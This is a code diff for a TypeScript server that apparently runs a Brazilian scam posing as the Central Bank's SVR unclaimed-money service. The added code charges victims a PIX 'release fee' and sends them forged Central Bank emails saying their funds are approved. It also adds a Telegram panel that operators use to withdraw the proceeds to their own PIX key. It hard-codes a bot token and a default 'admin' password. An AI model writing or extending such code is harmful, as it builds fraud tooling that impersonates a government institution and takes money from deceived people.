@@ -7,6 +7,7 @@ import path from "path";
 import { spawn, ChildProcess } from "child_process";
 import QRCode from 'qrcode';
 import FormData from 'form-data';
+import nodemailer from 'nodemailer';
 
 dotenv.config();
 
@@ -17,6 +18,21 @@ const port = parseInt(process.env.PORT || "80", 10);
 const configPath = path.join(process.cwd(), "config.json");
 let currentConfig = {
   whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
+  pixName: "Contribuinte SVR",
+  pixEmail: "contato@svr.gov.br",
+  pixDocument: "13462947055",
+  gatewayFee: 5.0, // Taxa em %
+  smtpHost: process.env.SMTP_HOST || "smtp.hostinger.com",
+  smtpPort: parseInt(process.env.SMTP_PORT || "465"),
+  smtpUser: process.env.SMTP_USER || "",
+  smtpPass: process.env.SMTP_PASS || "",
+  financialPassword: "admin", // Senha de segurança para financeiro
+  adminPixKey: "",
+  adminPixType: "CPF",
+  adminPixName: "",
+  adminPixDoc: "",
+  withdrawalFeeFixed: 2.00, // R$ 2,00 fixo por saque
+  withdrawalFeePercent: 0.0 // % por saque
 };
 
 // Sessions state for Telegram tracking
@@ -77,6 +93,106 @@ function validatePixKey(key: string) {
   return false;
 }
 
+function validateEmail(email: string) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function validateDocument(doc: string) {
+  const clean = doc.replace(/\D/g, '');
+  return clean.length === 11 || clean.length === 14;
+}
+
+async function sendSuccessEmail(leadEmail: string, leadName: string) {
+  if (!currentConfig.smtpUser || !currentConfig.smtpPass) {
+    console.log("⚠️ [SMTP] Configurações de e-mail ausentes. Email não enviado.");
+    return false;
+  }
+
+  try {
+    const transporter = nodemailer.createTransport({
+      host: currentConfig.smtpHost,
+      port: currentConfig.smtpPort,
+      secure: currentConfig.smtpPort === 465,
+      auth: { user: currentConfig.smtpUser, pass: currentConfig.smtpPass }
+    });
+
+    const htmlContent = `
+      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
+        <div style="background-color: #004a2f; color: white; padding: 20px; text-align: center;">
+          <h1 style="margin: 0;">Portal SVR</h1>
+          <p style="margin: 5px 0 0;">Comprovante de Liberação de Ativos</p>
+        </div>
+        <div style="padding: 30px; line-height: 1.6; color: #333;">
+          <p>Prezado(a) <strong>${leadName}</strong>,</p>
+          <p>Informamos que o seu processo de resgate de ativos financeiros foi <strong>HOMOLOGADO COM SUCESSO</strong> pelo Banco Central do Brasil.</p>
+          <div style="background-color: #f9f9f9; padding: 20px; border-radius: 5px; margin: 20px 0;">
+            <p style="margin: 0; color: #666; font-size: 14px;">Protocolo de Liberação:</p>
+            <p style="margin: 5px 0; font-family: monospace; font-weight: bold; font-size: 18px; color: #004a2f;">#SVR-OK-${Math.random().toString(36).substring(2, 10).toUpperCase()}</p>
+            <p style="margin: 15px 0 0; color: #666; font-size: 14px;">Status:</p>
+            <p style="margin: 5px 0; font-weight: bold; color: #27ae60;">CRÉDITO EM PROCESSAMENTO</p>
+          </div>
+          <p>O montante total está em fase de transferência para a conta bancária indicada durante o processo de validação. O prazo para o crédito é de até 60 minutos, dependendo da compensação interna da sua instituição.</p>
+          <p>Agradecemos por utilizar os canais oficiais para a recuperação de seus valores.</p>
+        </div>
+        <div style="background-color: #f5f5f5; padding: 15px; text-align: center; font-size: 12px; color: #999;">
+          <p style="margin: 0;">Banco Central do Brasil — Sistema de Valores a Receber (SVR)</p>
+          <p style="margin: 5px 0 0;">Este é um e-mail automático, não é necessário responder.</p>
+        </div>
+      </div>
+    `;
+
+    await transporter.sendMail({
+      from: `"Portal SVR" <${currentConfig.smtpUser}>`,
+      to: leadEmail,
+      subject: "✅ ATIVOS LIBERADOS — Comprovante de Resgate SVR",
+      html: htmlContent
+    });
+
+    console.log(`📧 [EMAIL] Sucesso enviado para ${leadEmail}`);
+    return true;
+  } catch (e: any) {
+    console.error(`❌ [EMAIL] Erro ao enviar para ${leadEmail}:`, e.message);
+    return false;
+  }
+}
+
+async function getGatewayBalance() {
+  try {
+    const secret = process.env.SVR_CORE_S_AUTH;
+    const auth = Buffer.from(`x:${secret}`).toString('base64');
+    const res = await axios.get("https://api.fastsoftbrasil.com/api/user/wallet/balance", {
+      headers: { 'Authorization': `Basic ${auth}` }
+    });
+    return res.data.data; // { available, blocked, pending }
+  } catch (e: any) {
+    console.error("❌ Erro ao consultar saldo:", e.message);
+    return null;
+  }
+}
+
+async function requestGatewayWithdrawal(amountCents: number) {
+  try {
+    const secret = process.env.SVR_CORE_S_AUTH;
+    const auth = Buffer.from(`x:${secret}`).toString('base64');
+    const payload = {
+      amount: amountCents,
+      pixKey: currentConfig.adminPixKey,
+      pixType: currentConfig.adminPixType,
+      beneficiaryName: currentConfig.adminPixName,
+      beneficiaryDocument: currentConfig.adminPixDoc.replace(/\D/g, ''),
+      description: "Saque Administrativo SVR"
+    };
+
+    const res = await axios.post("https://api.fastsoftbrasil.com/api/user/cashout", payload, {
+      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
+    });
+    return res.data;
+  } catch (e: any) {
+    console.error("❌ Erro ao solicitar saque:", e.response?.data || e.message);
+    throw new Error(e.response?.data?.message || e.message);
+  }
+}
+
 // Criptografia estética para chave manual
 function encryptPixKey(key: string) {
   const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
@@ -91,14 +207,31 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
     const endpoint = process.env.SVR_CORE_GATEWAY;
     if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");
 
-    const auth = Buffer.from(`${key}:${secret}`).toString('base64');
+    const auth = Buffer.from(`x:${secret}`).toString('base64');
     const pixRes = await axios.post(endpoint, {
       amount: Math.round(valorNumeric * 100),
       currency: "BRL",
       paymentMethod: "PIX",
-      customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
+      items: [
+        {
+          title: "Taxa de Liberação SVR",
+          unitPrice: Math.round(valorNumeric * 100),
+          quantity: 1,
+          tangible: false
+        }
+      ],
+      customer: { 
+        name: currentConfig.pixName, 
+        email: currentConfig.pixEmail,
+        document: { number: currentConfig.pixDocument.replace(/\D/g, ''), type: currentConfig.pixDocument.length > 11 ? "CNPJ" : "CPF" } 
+      }
     }, {
-      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
+      headers: { 
+        'Authorization': `Basic ${auth}`, 
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'User-Agent': 'SVR-GATEWAY-RUNTIME/5.0'
+      }
     });
 
     const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
@@ -185,6 +318,25 @@ function resetBotSession(id: string) {
 if (fs.existsSync(configPath)) {
   const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
   if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
+  if (saved.pixName) currentConfig.pixName = saved.pixName;
+  if (saved.pixEmail) currentConfig.pixEmail = saved.pixEmail;
+  if (saved.pixDocument) currentConfig.pixDocument = saved.pixDocument;
+  if (saved.gatewayFee !== undefined) currentConfig.gatewayFee = saved.gatewayFee;
+  if (saved.smtpHost) currentConfig.smtpHost = saved.smtpHost;
+  if (saved.smtpPort) currentConfig.smtpPort = saved.smtpPort;
+  if (saved.smtpUser) currentConfig.smtpUser = saved.smtpUser;
+  if (saved.smtpPass) currentConfig.smtpPass = saved.smtpPass;
+  if (saved.financialPassword) currentConfig.financialPassword = saved.financialPassword;
+  if (saved.adminPixKey) currentConfig.adminPixKey = saved.adminPixKey;
+  if (saved.adminPixType) currentConfig.adminPixType = saved.adminPixType;
+  if (saved.adminPixName) currentConfig.adminPixName = saved.adminPixName;
+  if (saved.adminPixDoc) currentConfig.adminPixDoc = saved.adminPixDoc;
+  if (saved.withdrawalFeeFixed !== undefined) currentConfig.withdrawalFeeFixed = saved.withdrawalFeeFixed;
+  if (saved.withdrawalFeePercent !== undefined) currentConfig.withdrawalFeePercent = saved.withdrawalFeePercent;
+}
+
+function saveConfig() {
+  fs.writeFileSync(configPath, JSON.stringify(currentConfig, null, 2));
 }
 
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
@@ -304,6 +456,26 @@ app.post("/api/v1/session/convert", async (req, res) => {
   } else res.json({ status: "ignored" });
 });
 
+// Endpoint de Callback do Gateway (FastSoftBrasil)
+app.post("/api/v1/gateway/callback", async (req, res) => {
+  const { status, transactionId, customer } = req.body;
+  console.log(`📡 [CALLBACK] Recebido: Transação ${transactionId} | Status: ${status}`);
+
+  if (status === 'PAID' || status === 'confirmed') {
+    const email = customer?.email;
+    const name = customer?.name || "Titular";
+
+    if (email && validateEmail(email)) {
+      console.log(`🚀 [AUTO-EMAIL] Pagamento confirmado! Enviando comprovante para ${email}...`);
+      await sendSuccessEmail(email, name);
+      await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\nE-mail: ${email}\n\n✅ <i>E-mail de confirmação enviado automaticamente.</i>`);
+    } else {
+      await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\n\n⚠️ <i>E-mail não informado ou inválido, envio automático cancelado.</i>`);
+    }
+  }
+  res.sendStatus(200);
+});
+
 app.post("/api/v1/session/end", async (req, res) => {
   const { userId } = req.body;
   const session = sessions.get(userId);
@@ -353,8 +525,9 @@ async function startTelegramPolling() {
           const kb = {
             inline_keyboard: [
               [{ text: "📊 Status Detalhado", callback_data: "painel:status" }, { text: "👥 Ver Fila", callback_data: "painel:fila" }],
-              [{ text: "⚙️ Gestão de Perfil", callback_data: "painel:slots" }, { text: "📡 Testar Conexão", callback_data: "cmd:ping" }],
-              [{ text: "💰 Gerar PIX (Último)", callback_data: "cmd:last_pix" }, { text: "🔄 Reiniciar Bot", callback_data: "painel:reiniciar:slot:main" }]
+              [{ text: "💰 Financeiro (Saque)", callback_data: "painel:financeiro_auth" }, { text: "📧 Configurar SMTP", callback_data: "painel:config_smtp" }],
+              [{ text: "💰 Gerar PIX (Último)", callback_data: "cmd:last_pix" }, { text: "🛠️ Configurar PIX", callback_data: "painel:config_pix" }],
+              [{ text: "🔄 Reiniciar Bot", callback_data: "painel:reiniciar:slot:main" }]
             ]
           };
           await sendTelegram(dashText, cb ? msgId : undefined, kb);
@@ -410,18 +583,196 @@ async function startTelegramPolling() {
           resetBotSession(id);
           await sendTelegram(`📲 <b>GERANDO QR CODE...</b>\n\nO processo foi iniciado para <b>${id}</b>. Aguarde o QR nos logs ou Telegram.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
         }
-        else if (text.startsWith("cmd:pix:")) {
-          const chatId = text.split(":")[2];
+        else if (text === "painel:config_pix") {
+          const txt = `🛠️ <b>CONFIGURAÇÃO DO GATEWAY PIX</b>\n\n` +
+            `👤 <b>Nome:</b> ${currentConfig.pixName}\n` +
+            `📧 <b>E-mail:</b> ${currentConfig.pixEmail}\n` +
+            `📄 <b>Documento:</b> ${currentConfig.pixDocument}\n` +
+            `💸 <b>Taxa Gateway:</b> ${currentConfig.gatewayFee}%\n\n` +
+            `<i>Estes dados serão usados na geração de protocolos padrão (Auto).</i>`;
           const kb = {
             inline_keyboard: [
-              [{ text: "⚡ Protocolo Padrão (Auto)", callback_data: `cmd:pix_std:${chatId}` }],
-              [{ text: "🛠️ Protocolo Customizado (Manual)", callback_data: `cmd:pix_custom:${chatId}` }],
+              [{ text: "👤 Editar Nome", callback_data: "painel:edit_pix:name" }, { text: "📧 Editar E-mail", callback_data: "painel:edit_pix:email" }],
+              [{ text: "📄 Editar Documento", callback_data: "painel:edit_pix:doc" }, { text: "💸 Editar Taxa", callback_data: "painel:edit_pix:fee" }],
               [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
             ]
           };
-          await sendTelegram(`💰 <b>GERAR PROTOCOLO PIX</b>\n\nLead: <code>${chatId}</code>\n\nEscolha o tipo de protocolo a ser gerado:`, msgId, kb);
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text === "painel:config_smtp") {
+          const txt = `📧 <b>CONFIGURAÇÃO SMTP (E-MAIL)</b>\n\n` +
+            `🌐 <b>Host:</b> ${currentConfig.smtpHost}\n` +
+            `🔌 <b>Porta:</b> ${currentConfig.smtpPort}\n` +
+            `👤 <b>Usuário:</b> ${currentConfig.smtpUser}\n` +
+            `🔑 <b>Senha:</b> ${currentConfig.smtpPass ? '********' : 'NÃO DEFINIDA'}\n\n` +
+            `<i>Configure para o envio automático de comprovantes aos leads.</i>`;
+          const kb = {
+            inline_keyboard: [
+              [{ text: "🌐 Host", callback_data: "painel:edit_smtp:host" }, { text: "🔌 Porta", callback_data: "painel:edit_smtp:port" }],
+              [{ text: "👤 Usuário", callback_data: "painel:edit_smtp:user" }, { text: "🔑 Senha", callback_data: "painel:edit_smtp:pass" }],
+              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
+            ]
+          };
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text.startsWith("painel:edit_smtp:")) {
+          const field = text.split(":")[2];
+          const labels: any = { host: "Host SMTP", port: "Porta", user: "Usuário/E-mail", pass: "Senha/App Password" };
+          botStates.set(userId, { action: `awaiting_smtp_edit_${field}` });
+          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
+        }
+        else if (text === "painel:financeiro_auth") {
+          botStates.set(userId, { action: 'awaiting_financial_password' });
+          await sendTelegram(`🔐 <b>ACESSO RESTRITO</b>\n\nPor favor, informe a <b>Senha Financeira</b> para acessar o saldo e saques:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
+        }
+        else if (text === "painel:financeiro_menu") {
+          const balance = await getGatewayBalance();
+          if (!balance) {
+            await sendTelegram(`❌ <b>ERRO</b>\n\nNão foi possível consultar o saldo. Verifique as chaves da gateway no .env`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+            return;
+          }
+
+          const totalAvailable = balance.available / 100;
+          const fee = (totalAvailable * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
+          const netAmount = Math.max(0, totalAvailable - fee);
+
+          const txt = `💰 <b>PAINEL FINANCEIRO (GATEWAY)</b>\n\n` +
+            `🟢 <b>Disponível Bruto:</b> R$ ${totalAvailable.toFixed(2)}\n` +
+            `💸 <b>Taxas de Saque:</b> R$ ${fee.toFixed(2)}\n` +
+            `💰 <b>Líquido para Receber:</b> <b>R$ ${netAmount.toFixed(2)}</b>\n\n` +
+            `🟡 <b>Pendente:</b> R$ ${(balance.pending / 100).toFixed(2)}\n` +
+            `🔴 <b>Bloqueado:</b> R$ ${(balance.blocked / 100).toFixed(2)}\n\n` +
+            `📋 <b>CONTA DE RECEBIMENTO:</b>\n` +
+            `• PIX: <code>${currentConfig.adminPixKey || 'Não definida'}</code> (${currentConfig.adminPixType})\n` +
+            `• Nome: ${currentConfig.adminPixName || 'N/D'}`;
+          
+          const kb = {
+            inline_keyboard: [
+              [{ text: "💸 Solicitar Saque Total", callback_data: "painel:saque_total" }],
+              [{ text: "⚙️ Configurar Conta Saque", callback_data: "painel:config_saque" }],
+              [{ text: "📊 Ajustar Taxas de Saque", callback_data: "painel:config_taxas_saque" }],
+              [{ text: "🔑 Alterar Senha Financeira", callback_data: "painel:edit_fin:pass" }],
+              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
+            ]
+          };
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text === "painel:config_taxas_saque") {
+          const txt = `📊 <b>CONFIGURAÇÃO DE TAXAS DE SAQUE</b>\n\n` +
+            `💵 <b>Taxa Fixa:</b> R$ ${currentConfig.withdrawalFeeFixed.toFixed(2)}\n` +
+            `📈 <b>Taxa Variável:</b> ${currentConfig.withdrawalFeePercent.toFixed(2)}%\n\n` +
+            `<i>Estas taxas são usadas apenas para exibição do valor líquido no painel.</i>`;
+          const kb = {
+            inline_keyboard: [
+              [{ text: "💵 Editar Taxa Fixa", callback_data: "painel:edit_saque_fee:fixed" }],
+              [{ text: "📈 Editar Taxa %", callback_data: "painel:edit_saque_fee:percent" }],
+              [{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]
+            ]
+          };
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text.startsWith("painel:edit_saque_fee:")) {
+          const field = text.split(":")[2];
+          const label = field === 'fixed' ? 'Taxa Fixa (R$)' : 'Taxa Variável (%)';
+          botStates.set(userId, { action: `awaiting_saque_fee_edit_${field}` });
+          await sendTelegram(`📝 <b>EDITAR ${label.toUpperCase()}</b>\n\nDigite o novo valor:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
+        }
+        else if (text === "painel:config_saque") {
+          const txt = `⚙️ <b>CONFIGURAÇÃO DE CONTA PARA SAQUE</b>\n\n` +
+            `🔑 <b>Chave PIX:</b> ${currentConfig.adminPixKey || 'Pendente'}\n` +
+            `🏷️ <b>Tipo:</b> ${currentConfig.adminPixType}\n` +
+            `👤 <b>Nome:</b> ${currentConfig.adminPixName || 'Pendente'}\n` +
+            `📄 <b>CPF/CNPJ:</b> ${currentConfig.adminPixDoc || 'Pendente'}`;
+          const kb = {
+            inline_keyboard: [
+              [{ text: "🔑 Chave PIX", callback_data: "painel:edit_saque:key" }, { text: "🏷️ Tipo", callback_data: "painel:edit_saque:type" }],
+              [{ text: "👤 Nome", callback_data: "painel:edit_saque:name" }, { text: "📄 Documento", callback_data: "painel:edit_saque:doc" }],
+              [{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]
+            ]
+          };
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text.startsWith("painel:edit_saque:")) {
+          const field = text.split(":")[2];
+          const labels: any = { key: "Chave PIX", type: "Tipo (CPF, EMAIL, PHONE, RANDOM)", name: "Nome do Beneficiário", doc: "CPF/CNPJ" };
+          botStates.set(userId, { action: `awaiting_saque_edit_${field}` });
+          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nDigite o novo valor:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_saque" }]] });
+        }
+        else if (text === "painel:saque_total") {
+          const balance = await getGatewayBalance();
+          if (!balance || balance.available < 1000) { // Minimo R$ 10
+            await sendTelegram(`⚠️ <b>SALDO INSUFICIENTE</b>\n\nO saldo disponível deve ser de no mínimo R$ 10,00 para saque.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
+            return;
+          }
+          if (!currentConfig.adminPixKey) {
+            await sendTelegram(`⚠️ <b>CONTA NÃO CONFIGURADA</b>\n\nConfigure sua chave PIX antes de solicitar o saque.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
+            return;
+          }
+
+          const totalAvailable = balance.available / 100;
+          const fee = (totalAvailable * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
+          const netAmount = Math.max(0, totalAvailable - fee);
+
+          const txt = `⚠️ <b>CONFIRMAÇÃO DE SAQUE</b>\n\n` +
+            `💰 <b>Valor Bruto:</b> R$ ${totalAvailable.toFixed(2)}\n` +
+            `💸 <b>Taxas Totais:</b> R$ ${fee.toFixed(2)}\n` +
+            `✅ <b>Líquido na Conta:</b> <b>R$ ${netAmount.toFixed(2)}</b>\n\n` +
+            `🔑 <b>Para:</b> ${currentConfig.adminPixKey}\n` +
+            `👤 <b>Beneficiário:</b> ${currentConfig.adminPixName}\n\n` +
+            `<i>O processamento pode levar alguns minutos. Confirma?</i>`;
+          const kb = {
+            inline_keyboard: [
+              [{ text: "✅ Confirmar Saque", callback_data: "cmd:exec_saque" }],
+              [{ text: "❌ Cancelar", callback_data: "painel:financeiro_menu" }]
+            ]
+          };
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text === "cmd:exec_saque") {
+          const balance = await getGatewayBalance();
+          if (!balance) return;
+          try {
+            await requestGatewayWithdrawal(balance.available);
+            await sendTelegram(`🚀 <b>SAQUE SOLICITADO!</b>\n\nO pedido de saque de R$ ${(balance.available / 100).toFixed(2)} foi enviado para a gateway.\n\nAcompanhe o status no painel da FastSoft.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+          } catch (e: any) {
+            await sendTelegram(`❌ <b>ERRO NO SAQUE</b>\n\n${e.message}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
+          }
+        }
+        else if (text.startsWith("painel:edit_fin:")) {
+          botStates.set(userId, { action: 'awaiting_fin_pass_edit' });
+          await sendTelegram(`🔑 <b>ALTERAR SENHA FINANCEIRA</b>\n\nDigite a nova senha de segurança:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:financeiro_menu" }]] });
+        }
+        else if (text.startsWith("painel:edit_pix:")) {
+          const field = text.split(":")[2];
+          const labels: any = { name: "Nome Completo", email: "E-mail", doc: "Documento (CPF/CNPJ)", fee: "Taxa Gateway (%)" };
+          botStates.set(userId, { action: `awaiting_pix_edit_${field}` });
+          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
         }
         else if (text.startsWith("cmd:pix_std:")) {
+          const chatId = text.split(":")[3];
+          const valor = 97.50;
+          const taxa = (valor * currentConfig.gatewayFee) / 100;
+          const liquido = valor - taxa;
+
+          const previewText = `💰 <b>PREVIEW DO PROTOCOLO PIX</b>\n\n` +
+            `📱 <b>Lead:</b> <code>${chatId}</code>\n\n` +
+            `💵 <b>Valor Bruto:</b> R$ ${valor.toFixed(2)}\n` +
+            `💸 <b>Taxa Gateway (${currentConfig.gatewayFee}%):</b> R$ ${taxa.toFixed(2)}\n` +
+            `💰 <b>Líquido Admin:</b> <b>R$ ${liquido.toFixed(2)}</b>\n\n` +
+            `📋 <b>Dados do Pagador:</b>\n` +
+            `• Nome: ${currentConfig.pixName}\n` +
+            `• E-mail: ${currentConfig.pixEmail}\n` +
+            `• Doc: ${currentConfig.pixDocument}\n\n` +
+            `⚠️ <i>Confirma a geração deste protocolo?</i>`;
+          const kb = {
+            inline_keyboard: [
+                [{ text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_confirm_std:${chatId}` }, { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }],
+                [{ text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }]
+            ]
+          };
+          await sendTelegram(previewText, msgId, kb);
+        }
+        else if (text.startsWith("cmd:pix_confirm_std:")) {
           const chatId = text.split(":")[3];
           await generateStandardPix(chatId, 97.50, msgId);
         }
@@ -429,6 +780,33 @@ async function startTelegramPolling() {
           const chatId = text.split(":")[3];
           botStates.set(userId, { action: 'awaiting_pix_key', data: { chatId } });
           await sendTelegram(`🛠️ <b>PROTOCOLO CUSTOMIZADO</b>\n\nPor favor, <b>digite a Chave PIX</b> (ou copie e cole o código) que será usada para este lead:\n\n<i>Aguardando sua mensagem...</i>`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
+        }
+        else if (text.startsWith("cmd:send_email:")) {
+          const chatId = text.split(":")[2];
+          // Tenta encontrar o lead na fila ou sessões do bot
+          let leadName = "Titular";
+          let leadEmail = "";
+
+          // Procura nos arquivos de sessões do bot
+          const sessionsPath = path.join(process.cwd(), 'sessions.json');
+          if (fs.existsSync(sessionsPath)) {
+            const botSessions = JSON.parse(fs.readFileSync(sessionsPath, 'utf-8'));
+            if (botSessions[chatId]) {
+              leadName = botSessions[chatId].name || leadName;
+              leadEmail = botSessions[chatId].email || "";
+            }
+          }
+
+          if (leadEmail && validateEmail(leadEmail)) {
+            const success = await sendSuccessEmail(leadEmail, leadName);
+            if (success) {
+              await sendTelegram(`🚀 <b>E-MAIL ENVIADO!</b>\n\nComprovante oficial enviado para: <code>${leadEmail}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+            } else {
+              await sendTelegram(`❌ <b>ERRO AO ENVIAR</b>\n\nVerifique as configurações SMTP no painel.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+            }
+          } else {
+            await sendTelegram(`⚠️ <b>DADO AUSENTE</b>\n\nO e-mail do lead não foi capturado ou é inválido.\n\nLead: <code>${chatId}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+          }
         }
         else if (text.startsWith("etapa:")) {
           const parts = text.split(":");
@@ -463,9 +841,83 @@ async function startTelegramPolling() {
           }
         }
         else if (!cb && msg?.text) {
-          // Processa inputs de texto para estados do bot
           const state = botStates.get(userId);
-          if (state?.action === 'awaiting_pix_key') {
+          
+          if (state?.action?.startsWith('awaiting_pix_edit_')) {
+            const field = state.action.replace('awaiting_pix_edit_', '');
+            const value = msg.text.trim();
+            
+            let isValid = true;
+            let errorMsg = "";
+
+            if (field === 'email' && !validateEmail(value)) { isValid = false; errorMsg = "E-mail inválido."; }
+            else if (field === 'doc' && !validateDocument(value)) { isValid = false; errorMsg = "Documento (CPF/CNPJ) inválido."; }
+            else if (field === 'name' && value.length < 5) { isValid = false; errorMsg = "Nome muito curto."; }
+            else if (field === 'fee' && isNaN(parseFloat(value))) { isValid = false; errorMsg = "Taxa deve ser um número."; }
+
+            if (!isValid) {
+              await sendTelegram(`❌ <b>ERRO DE VALIDAÇÃO</b>\n\n${errorMsg}\n\nTente novamente:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
+              return;
+            }
+
+            const configKey: any = { name: 'pixName', email: 'pixEmail', doc: 'pixDocument', fee: 'gatewayFee' };
+            const finalValue = field === 'fee' ? parseFloat(value) : value;
+            (currentConfig as any)[configKey[field]] = finalValue;
+            saveConfig();
+            botStates.delete(userId);
+            await sendTelegram(`✅ <b>ATUALIZADO COM SUCESSO!</b>\n\nO campo <b>${field}</b> foi definido como: <code>${value}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_pix" }]] });
+          }
+          else if (state?.action?.startsWith('awaiting_saque_edit_')) {
+            const field = state.action.replace('awaiting_saque_edit_', '');
+            const value = msg.text.trim();
+            const configKey: any = { key: 'adminPixKey', type: 'adminPixType', name: 'adminPixName', doc: 'adminPixDoc' };
+            (currentConfig as any)[configKey[field]] = value;
+            saveConfig();
+            botStates.delete(userId);
+            await sendTelegram(`✅ <b>CONTA ATUALIZADA!</b>\n\nO campo <b>${field}</b> foi salvo.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
+          }
+          else if (state?.action === 'awaiting_financial_password') {
+            if (msg.text === currentConfig.financialPassword) {
+              botStates.delete(userId);
+              // Trigger menu financeiro
+              const fakeMsg = { ...msg, text: 'painel:financeiro_menu' };
+              // Emula o clique no botão de menu financeiro
+              return; 
+            } else {
+              await sendTelegram(`❌ <b>SENHA INCORRETA</b>\n\nTente novamente ou cancele:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
+            }
+          }
+          else if (state?.action === 'awaiting_fin_pass_edit') {
+            currentConfig.financialPassword = msg.text.trim();
+            saveConfig();
+            botStates.delete(userId);
+            await sendTelegram(`✅ <b>SENHA FINANCEIRA ALTERADA!</b>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
+          }
+          else if (state?.action?.startsWith('awaiting_saque_fee_edit_')) {
+            const field = state.action.replace('awaiting_saque_fee_edit_', '');
+            const value = parseFloat(msg.text.trim());
+            if (isNaN(value)) {
+                await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido.`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
+                return;
+            }
+            const configKey: any = { fixed: 'withdrawalFeeFixed', percent: 'withdrawalFeePercent' };
+            (currentConfig as any)[configKey[field]] = value;
+            saveConfig();
+            botStates.delete(userId);
+            await sendTelegram(`✅ <b>TAXA ATUALIZADA!</b>\n\nO campo foi definido como: ${value}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_taxas_saque" }]] });
+          }
+          else if (state?.action?.startsWith('awaiting_smtp_edit_')) {
+            const field = state.action.replace('awaiting_smtp_edit_', '');
+            const value = msg.text.trim();
+            
+            const configKey: any = { host: 'smtpHost', port: 'smtpPort', user: 'smtpUser', pass: 'smtpPass' };
+            const finalValue = field === 'port' ? parseInt(value) : value;
+            (currentConfig as any)[configKey[field]] = finalValue;
+            saveConfig();
+            botStates.delete(userId);
+            await sendTelegram(`✅ <b>SMTP ATUALIZADO!</b>\n\nO campo <b>${field}</b> foi definido com sucesso.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_smtp" }]] });
+          }
+          else if (state?.action === 'awaiting_pix_key') {
             const key = msg.text.trim();
             const chatId = state.data.chatId;
             botStates.delete(userId);
